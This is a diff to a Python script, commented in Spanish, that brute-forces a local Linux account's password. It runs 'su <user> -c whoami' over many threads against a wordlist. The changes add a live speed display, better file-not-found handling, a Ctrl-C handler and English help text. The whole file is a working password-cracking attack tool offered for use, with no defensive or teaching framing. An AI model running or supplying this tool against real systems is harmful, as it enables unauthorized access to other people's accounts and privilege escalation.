@@ -33,15 +33,24 @@ def show_info(user, wordlist, threads, timeout):
     print(f"[*] Threads: {threads}")
     print(f"[*] Timeout: {timeout}")
     print(f"[i] Status: Starting brute-force attack...")
+    print(f"[i] Velocity: --- p/s")
     print("===========================================================================")
 
 # Cuenta las lineas de la wordlist
 def lineas_wordlist(wordlist):
     global n_lineas
     n_lineas = 0
-    with open(wordlist, "r", encoding="latin-1", errors="replace") as f:
-        for _ in f:
-            n_lineas += 1
+    try:
+        with open(wordlist, "r", encoding="latin-1", errors="replace") as f:
+            for _ in f:
+                n_lineas += 1
+    # Si no enceuntra el archivo lo dice
+    except FileNotFoundError:
+        print(f'Error: El archivo "{wordlist}" no fue encontrado.')
+        os._exit(1)
+    except Exception as e:
+        print(f'Error: {e} al intentar abrir el archivo "{wordlist}".')
+        os._exit(1)
 
 
 def ataque_threads(wordlist, usuario, num_threads, timeout):
@@ -76,10 +85,8 @@ def ataque_threads(wordlist, usuario, num_threads, timeout):
                     t.start()
                 for t in threads:
                     t.join() 
+            print(f"[i] Attack finished in {time.time() - inicio:.2f}. No passwords found :(, you can try with another wordlist.")
                 
-    # Si no enceuntra el archivo lo dice
-    except FileNotFoundError:
-        print(f'Error: El archivo "{wordlist}" no fue encontrado.')
     # Si da otro error tmbn lo dice
     except Exception as e:
         print(f'Error: {e} al intentar abrir el archivo "{wordlist}".')
@@ -93,9 +100,15 @@ def probar_contraseña(password, usuario, timeout, index):
         with lock:
             if encontrada:
                 return
-            # /r para volver al inicio de la línea y sobrescribir \033[2F para mover cursor arriba 2 lineas y \033[K para limpiar la línea
-            # \033[2B para bajar 2 lineas y \033[0G para volver al inicio de la línea
-            print(f"\r\033[2F\033[K[i] Probando contraseña {index}/{n_lineas}: {password} \033[2B\033[0G", end="", flush=True)
+            
+            tiempo_transcurrido = time.time() - inicio
+            velocidad = index / tiempo_transcurrido
+            # /r para volver al inicio de la línea y sobrescribir \033[2F para mover cursor arriba 3 lineas y \033[K para limpiar la línea
+            # \033[2B para bajar 3 lineas y \033[0G para volver al inicio de la línea
+            print(f"\r\033[3F\033[K[i] Trying password {index}/{n_lineas}: {password}\033[3B\033[0G", end="", flush=True)
+            print(f"\r\033[2F\033[K[i] Velocity: {velocidad:.2f}/s \033[2B\033[0G", end="", flush=True)
+            
+            print("", end="", flush=True)
 
         # Ejecuta el comando su con la contraseña dada            
         result = subprocess.run(['su', usuario, '-c', 'whoami'], input=password, text=True, capture_output=True, timeout=timeout)
@@ -114,18 +127,23 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description=show_banner())
 
     # Argumento -w, diccionario
-    parser.add_argument('-w', '--wordlist', type=str, help="Ruta del diccionario de contraseñas", required=True)
+    parser.add_argument('-w', '--wordlist', type=str, help="Rute of the wordlist of passwords", required=True)
 
     # Argumento -u, usuario
-    parser.add_argument('-u', '--user', type=str, help="Usuario para probar contraseñas", required=True)
+    parser.add_argument('-u', '--user', type=str, help="User to try to get access", required=True)
 
     # Argumento -T, threads a usar
-    parser.add_argument('-T', '--threads', type=int, help="Threads a usar, por defecto 8", default=8, required=False)
+    parser.add_argument('-T', '--threads', type=int, help="Threads to use, by defacult 8", default=8, required=False)
 
     # Argumento -t, timeout
-    parser.add_argument('-t', '--timeout', type=float, help="Timeout", default=0.1, required=False)
+    parser.add_argument('-t', '--timeout', type=float, help="Timeout, by default 0.1", default=0.1, required=False)
 
     args = parser.parse_args()
-    show_info(args.user, args.wordlist, args.threads, args.timeout)
-    lineas_wordlist(args.wordlist)
-    ataque_threads(args.wordlist, args.user, args.threads, args.timeout)
+    try:
+        lineas_wordlist(args.wordlist)
+        show_info(args.user, args.wordlist, args.threads, args.timeout)
+        ataque_threads(args.wordlist, args.user, args.threads, args.timeout)
+    except KeyboardInterrupt:
+            print(f"\rStoping attack...", end="", flush=True)
+            os._exit(1)
+    
